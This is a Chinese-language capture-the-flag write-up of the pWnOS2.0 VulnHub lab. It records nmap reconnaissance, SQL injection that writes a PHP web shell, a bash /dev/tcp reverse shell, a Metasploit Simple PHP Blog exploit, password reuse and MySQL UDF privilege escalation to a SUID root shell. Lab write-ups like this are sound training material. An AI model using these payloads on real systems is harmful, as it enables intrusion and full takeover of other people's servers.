+++
date = '2026-10-31T11:58:11+08:00'
draft = false
title = '[VulnHub靶机]pWnOS2.0渗透记录'
tags = ['渗透','Vulnhub','SQLi','SimplePHPBlog','UDF提权']
+++

## 信息收集

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.100

```shell
┌──(kali㉿kali)-[~/pWnOS2.0]
└─$ sudo arp-scan -l                                                                     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.100    00:0c:29:75:cb:67       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/pWnOS2.0]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.100
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 12:00 +0800
Nmap scan report for 10.10.10.100
Host is up (0.00096s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:75:CB:67 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
```

深入扫描

```shell
┌──(kali㉿kali)-[~/pWnOS2.0]
└─$ sudo nmap -sT -sV -sC -p22,80 10.10.10.100                                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 12:01 +0800
Nmap scan report for 10.10.10.100
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-server-header: Apache/2.2.17 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to this Site!
MAC Address: 00:0C:29:75:CB:67 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/pWnOS2.0]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.100                                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-31 12:02 +0800
Nmap scan report for 10.10.10.100
Host is up (0.00049s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|       httponly flag not set
|   /login/: 
|     PHPSESSID: 
|       httponly flag not set
|   /index/: 
|     PHPSESSID: 
|       httponly flag not set
|   /register/: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /login.php: Possible admin folder
|   /login/: Login page
|   /info.php: Possible information file
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
|   /index/: Potentially interesting folder
|   /info/: Potentially interesting folder
|_  /register/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.100
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.100:80/register.php
|     Form id: 
|     Form action: register.php
|     
|     Path: http://10.10.10.100:80/login.php
|     Form id: 
|_    Form action: login.php
MAC Address: 00:0C:29:75:CB:67 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.49 seconds
```

## 漏洞利用

### 法一: SQL注入

访问80端口的Web服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

注意到右边有个Login, 把它点开后是登录界面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2.avif)

用户名输入`admin'`, 出现错误信息, 很可能存在SQL注入漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.avif)

用户名输入`admin' or 1; -- -`, 点击登录发现一直Logging in

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/Loggingin.avif)

使用SQLmap自动化注入

```shell
sqlmap -u http://10.10.10.100/login.php --data="email=admin&pass=aegrt&submit=Login&submitted=TRUE" -p email --dbms mysql --method POST --technique=E --dbs --batch
```

```text
available databases [3]:
[*] ch16                    
[*] information_schema
[*] mysql
```

查看ch16的表

```shell
sqlmap -u http://10.10.10.100/login.php --data="email=admin&pass=aegrt&submit=Login&submitted=TRUE" -p email --dbms mysql --method POST --technique=E -D ch16 --tab
les --batch
```

```text
Database: ch16
[1 table]
+-------+
| users |
+-------+
```

dump这个表, 发现下面的信息

```text
Database: ch16
Table: users
[1 entry]
+---------+------------------------------------------+------------------+----------+-----------+------------+------------+---------------------+
| user_id | pass                                     | email            | active   | last_name | first_name | user_level | registration_date   |
+---------+------------------------------------------+------------------+----------+-----------+------------+------------+---------------------+
| 1       | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af | admin@isints.com | NULL     | Privett   | Dan        | 0          | 2011-05-07 17:27:01 |
+---------+------------------------------------------+------------------+----------+-----------+------------+------------+---------------------+
```

在somd5上查询密码哈希

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.avif)

现在我们得到了一组凭据:  
admin@isints.com:killerbeesareflying  
使用它重新登录, 却发现被拦截

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E7%99%BB%E5%BD%95%E8%A2%AB%E6%8B%A6%E6%88%AA.avif)

使用SQLmap读取靶机上的passwd文件

```shell
sqlmap -u http://10.10.10.100/login.php --data="email=admin&pass=aegrt&submit=Login&submitted=TRUE" -p email --dbms mysql --method POST --technique=E --file-read="/etc/passwd" --batch
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
```

尝试使用killerbeesareflying作为密码登录dan用户, 也失败了

```shell
ssh dan@10.10.10.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dan@10.10.10.100's password: 
Permission denied, please try again.
```

回顾之前的nmap扫描结果, 发现存在/info/目录, 进入发现是phpinfo页面, 并且DBA为enable, 这意味着我们可以通过SQL注入向网站写入文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E5%8F%91%E7%8E%B0DBA%E5%BC%80%E5%90%AF.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%9C%A8www.avif)

这里不知道为什么SQLmap写不进去, 所以改为手动注入, 结果试了半天也没成功, 回头一看原来网站根目录在/var/www, 没有html, 目录不存在所以写不进去  
使用正确的路径重新注入

```shell
curl http://10.10.10.100/login.php -d "email='+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,\"<%3fphp+system(\$_GET['cmd'])%3b%3f>\"+into+outfile+'/var/www/webshell.php'--+-&pass=admin123&submit=Login&submitted=TRUE" -X POST
```

攻击机在4444端口开启监听, 访问http://10.10.10.100/webshell.php?cmd=bash+-c+%27bash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%27即可获得shell

```shell
rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.10.100: inverse host lookup failed: Unknown host
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.100] 41912
bash: no job control in this shell
www-data@web:/var/www$
```

### 法二: Simple PHP Blog RCE

回顾nmap的扫描结果, 注意到网站存在/blog/目录, 访问发现应该是个CMS系统

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E8%AE%BF%E9%97%AEblog.avif)

查看页面源码, 发现是Simple PHP Blog

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/pWnOS2.0%20/%E8%AF%86%E5%88%ABSimplePHPBlog.avif)

通过网络搜索, 得知直接请求/config/password可以获得密码哈希, 访问http://10.10.10.100/blog/config/password.txt, 果然拿到了哈希

```text
$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
```

somd5查询无果, 通过john爆破也没有结果

```shell
echo '$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/' > passhash.txt
┌──(kali㉿kali)-[~/pWnOS2.0]                                                                                                                                           
└─$ john passhash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                      
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                                                                           
Use the "--format=md5crypt-long" option to force loading these as that type instead                                                                                    
Using default input encoding: UTF-8                                                
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])                                                                                  
Will run 8 OpenMP threads                                                          
Press 'q' or Ctrl-C to abort, almost any other key for status                      
0g 0:00:00:38 DONE (2026-10-31 14:51) 0g/s 369304p/s 369304c/s 369304C/s !!!0mc3t..*7¡Vamos!
Session completed.
```

在Metasploit中查找相关漏洞, 发现一个RCE漏洞

```shell
msf > search simple php blog                                                       
                                                                                   
Matching Modules                                                                   
================                                                                   
                                                                                   
   #  Name                                      Disclosure Date  Rank       Check  Description                                                                         
   -  ----                                      ---------------  ----       -----  -----------                                                                         
   0  exploit/unix/webapp/sphpblog_file_upload  2005-08-25       excellent  Yes    Simple PHP Blog Remote Command Execution                                            
                                                                                                                                                                       
                                                                                   
Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/sphpblog_file_upload
```

配置参数, 执行run即可拿到shell

```shell
msf exploit(unix/webapp/sphpblog_file_upload) > set RHOSTS 10.10.10.100
RHOSTS => 10.10.10.100
msf exploit(unix/webapp/sphpblog_file_upload) > set URI /blog
URI => /blog
msf exploit(unix/webapp/sphpblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.10.3:4444 
[+] Successfully retrieved hash: $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
[+] Successfully removed /config/password.txt
[+] Successfully created temporary account.
[+] Successfully logged in as MgfgaE:SolIY5
[+] Successfully retrieved cookie: j8pqfps3u0qe1indmj65v8e0b6
[+] Successfully uploaded EL3iKuhYCqFqVd5piNCD.php
[+] Successfully uploaded k9xwXS457VR3xK2SjUNk.php
[+] Successfully reset original password hash.
[+] Successfully removed /images/EL3iKuhYCqFqVd5piNCD.php
[*] Calling payload: /images/k9xwXS457VR3xK2SjUNk.php
[*] Sending stage (45739 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.10.3:4444 -> 10.10.10.100:35248) at 2026-10-31 14:57:24 +0800
[+] Successfully removed /images/k9xwXS457VR3xK2SjUNk.php

meterpreter >
```

## 权限提升

输入shell进入终端, 通过python升级终端

```shell
meterpreter > shell
Process 1076 created.
Channel 2 created.
sh: getcwd() failed: No such file or directory
sh: getcwd() failed: No such file or directory
tty       
not a tty
python -c "import pty;pty.spawn('/bin/bash')"
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@web:$
```

发现一些命令无法正常执行, 打印$SHELL发现当前使用的是sh, 切换为bash

```shell
www-data@web:/$ /bin/bash
/bin/bash
www-data@web:/$ pwd
pwd
/
```

### 法一: 密码碰撞

翻了一会靶机文件, 发现/var目录下有一个数据库配置文件, 这不太常见, 读取看看

```shell
www-data@web:/var$ ls 
ls
backups  crash       lib    lock  mail                opt  spool  uploads
cache    index.html  local  log   mysqli_connect.php  run  tmp    www
```

```php
<?php # Script 8.2 - mysqli_connect.php

// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.

// Set the database access information as constants:

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

// Make the connection:

$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
```

尝试使用root@ISIntS作为密码登录root账户

```shell
www-data@web:/var$ su root
su root
Password: ISIntS

su: Authentication failure
www-data@web:/var$ su root
su root
Password: root@ISIntS

root@web:/var# whoami
whoami
root
```

成功提权

### 法二: MySQL UDF

搜索mysql进程, 发现它是以root身份运行的

```shell
www-data@web:/var$ ps aux | grep mysql
ps aux | grep mysql
root       775  0.0  4.8 170444 24224 ?        Ssl  08:13   0:02 /usr/sbin/mysqld
www-data  1168  0.0  0.1   6296   592 pts/0    S+   11:52   0:00 grep mysql
```

使用用户名root密码root@ISIntS(在方法1中得到)登录mysql

```shell
mysql -uroot -proot@ISIntS
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 368
Server version: 5.1.54-1ubuntu4 (Ubuntu)

Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL v2 license

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

查看secure_file_priv变量, 确认其为空

```sql
mysql> show variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.00 sec)
```

确定pulgin目录位置

```sql
mysql> show variables like "%plugin%";
+---------------+-----------------------+
| Variable_name | Value                 |
+---------------+-----------------------+
| plugin_dir    | /usr/lib/mysql/plugin |
+---------------+-----------------------+
1 row in set (0.00 sec)
```

查询已有函数

```sql
mysql> SELECT * FROM mysql.func;
Empty set (0.00 sec)
```

查看mysql版本, 是64位的

```sql
mysql> SHOW variables like '%version%';
+-------------------------+------------------+
| Variable_name           | Value            |
+-------------------------+------------------+
| protocol_version        | 10               |
| version                 | 5.1.54-1ubuntu4  |
| version_comment         | (Ubuntu)         |
| version_compile_machine | x86_64           |
| version_compile_os      | debian-linux-gnu |
+-------------------------+------------------+
5 rows in set (0.00 sec)
```

检查靶机环境

```shell
www-data@web:/var$ which gcc wget
/usr/bin/gcc
/usr/bin/wget
```

靶机工具齐全, 可以继续  
使用/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so  
攻击机启动简易服务器

```shell
┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

靶机将so库下载到pulgin目录(/usr/lib/mysql/plugin)下

```shell
www-data@web:/usr/lib/mysql/plugin$ wget http://10.10.10.3:8000/lib_mysqludf_sys_64.so
</plugin$ wget http://10.10.10.3:8000/lib_mysqludf_sys_64.so                 
--2026-09-05 12:49:22--  http://10.10.10.3:8000/lib_mysqludf_sys_64.so
Connecting to 10.10.10.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8040 (7.9K) [application/octet-stream]
Saving to: `lib_mysqludf_sys_64.so'

100%[======================================>] 8,040       --.-K/s   in 0s      

2026-09-05 12:49:22 (982 MB/s) - `lib_mysqludf_sys_64.so' saved [8040/8040]
```

在MySQL中创建函数sys_eval()函数

```sql
mysql> CREATE FUNCTION sys_eval RETURNS STRING SONAME "lib_mysqludf_sys_64.so";
Query OK, 0 rows affected (0.00 sec)
```

现在我们就可以通过MySQL执行系统命令了

```sql
mysql> SELECT sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root               |
+--------------------+
1 row in set (0.00 sec)
```

将bash复制到/tmp下

```sql
mysql> SELECT sys_eval('cp /bin/bash /tmp');
+-------------------------------+
| sys_eval('cp /bin/bash /tmp') |
+-------------------------------+
| NULL                          |
+-------------------------------+
1 row in set (0.00 sec)
```

加上SUID位, 这样就会以root身份运行

```sql
mysql> SELECT sys_eval('chmod u+s /tmp/bash');
+---------------------------------+
| sys_eval('chmod u+s /tmp/bash') |
+---------------------------------+
| NULL                            |
+---------------------------------+
1 row in set (0.00 sec)
```

接下来去运行/tmp/bash就可以提权成功了, 注意加上-p选项以保持特权

```shell
www-data@web:/tmp$ ./bash -p
bash-4.2# whoami
root
```

本靶机无flag, 获得root权限即提权成功
